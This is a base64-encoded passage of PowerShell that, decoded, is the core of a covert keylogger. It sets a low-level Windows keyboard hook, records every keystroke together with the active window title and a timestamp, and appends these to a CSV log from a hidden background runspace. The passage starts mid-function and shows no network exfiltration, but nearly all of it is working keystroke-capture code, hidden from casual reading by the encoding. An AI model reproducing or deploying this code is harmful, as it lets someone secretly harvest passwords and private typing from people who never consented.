CAgICAgICAgICAgICAgICAgJEtleXM6OlJTaGlmdEtleSAgIHsgJEtleSA9ICc8U2hpZnQ+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpMQ29udHJvbEtleSB7ICRLZXkgPSAnPEN0cmw+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpSQ29udHJvbEtleSB7ICRLZXkgPSAnPEN0cmw+JyB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKCiAgICAgICAgICAgICAgICAkVGl0bGUgPSBOZXctT2JqZWN0IFRleHQuU3RyaW5nYnVpbGRlciAyNTYKICAgICAgICAgICAgICAgICRHZXRXaW5kb3dUZXh0Lkludm9rZSgkaFdpbmRvdywgJFRpdGxlLCAkVGl0bGUuQ2FwYWNpdHkpCgoKICAgICAgICAgICAgICAgICRQcm9wcyA9IEB7CiAgICAgICAgICAgICAgICAgICAgS2V5ID0gJEtleQogICAgICAgICAgICAgICAgICAgIFRpbWUgPSBbRGF0ZVRpbWVdOjpOb3cKICAgICAgICAgICAgICAgICAgICBXaW5kb3cgPSAkVGl0bGUuVG9TdHJpbmcoKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRvYmogPSBOZXctT2JqZWN0IHBzb2JqZWN0IC1Qcm9wZXJ0eSAkUHJvcHMKICAgICAgICAgICAgCgogICAgICAgICAgICAgICAgJENTVkVudHJ5ID0gKCRvYmogfCBTZWxlY3QtT2JqZWN0IEtleSxXaW5kb3csVGltZSB8IENvbnZlcnRUby1Dc3YgLU5vVHlwZUluZm9ybWF0aW9uKVsxXQoKCiAgICAgICAgICAgICAgICBPdXQtRmlsZSAtRmlsZVBhdGggJExvZ1BhdGggLUFwcGVuZCAtSW5wdXRPYmplY3QgJENTVkVudHJ5IC1FbmNvZGluZyB1bmljb2RlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuICRDYWxsTmV4dEhvb2tFeC5JbnZva2UoW0ludFB0cl06Olplcm8sICRDb2RlLCAkd1BhcmFtLCAkbFBhcmFtKQogICAgICAgIH0KCgogICAgICAgICREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50MzJdLCBbSW50UHRyXSwgW0ludFB0cl0pIChbSW50UHRyXSkKICAgICAgICAkQ2FsbGJhY2sgPSAkQ2FsbGJhY2tTY3JpcHQgLWFzICREZWxlZ2F0ZQogICAgCgogICAgICAgICRQb3NoTW9kdWxlID0gKEdldC1Qcm9jZXNzIC1JZCAkUElEKS5NYWluTW9kdWxlLk1vZHVsZU5hbWUKICAgICAgICAkTW9kdWxlSGFuZGxlID0gJEdldE1vZHVsZUhhbmRsZS5JbnZva2UoJFBvc2hNb2R1bGUpCgoKICAgICAgICAkSG9vayA9ICRTZXRXaW5kb3dzSG9va0V4Lkludm9rZSgweEQsICRDYWxsYmFjaywgJE1vZHVsZUhhbmRsZSwgMCkKICAgIAogICAgICAgICRTdG9wd2F0Y2ggPSBbRGlhZ25vc3RpY3MuU3RvcHdhdGNoXTo6U3RhcnROZXcoKQoKICAgICAgICB3aGlsZSAoJHRydWUpIHsKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVycy5UaW1lb3V0IC1hbmQgKCRTdG9wd2F0Y2guRWxhcHNlZC5Ub3RhbE1pbnV0ZXMgLWd0ICRUaW1lb3V0KSkgeyBicmVhayB9CiAgICAgICAgICAgICRQZWVrTWVzc2FnZS5JbnZva2UoW0ludFB0cl06Olplcm8sIFtJbnRQdHJdOjpaZXJvLCAweDEwMCwgMHgxMDksIDApCiAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgMTAKICAgICAgICB9CgogICAgICAgICRTdG9wd2F0Y2guU3RvcCgpCiAgICAKCiAgICAgICAgJFVuaG9va1dpbmRvd3NIb29rRXguSW52b2tlKCRIb29rKQogICAgfQoKCiAgICAkUG93ZXJTaGVsbCA9IFtQb3dlclNoZWxsXTo6Q3JlYXRlKCkKICAgIFt2b2lkXSRQb3dlclNoZWxsLkFkZFNjcmlwdCgkU2NyaXB0KQogICAgW3ZvaWRdJFBvd2VyU2hlbGwuQWRkQXJndW1lbnQoJExvZ1BhdGgpCiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzLlRpbWVvdXQpIHsgW3ZvaWRdJFBvd2VyU2hlbGwuQWRkQXJndW1lbnQoJFRpbWVvdXQpIH0KCgogICAgW3ZvaWRdJFBvd2VyU2hlbGwuQmVnaW5JbnZva2UoKQoKICAgIGlmICgkUGFzc1RocnUuSXNQcmVzZW50KSB7IHJldHVybiAkUG93ZXJTaGVsbCB9Cn0K
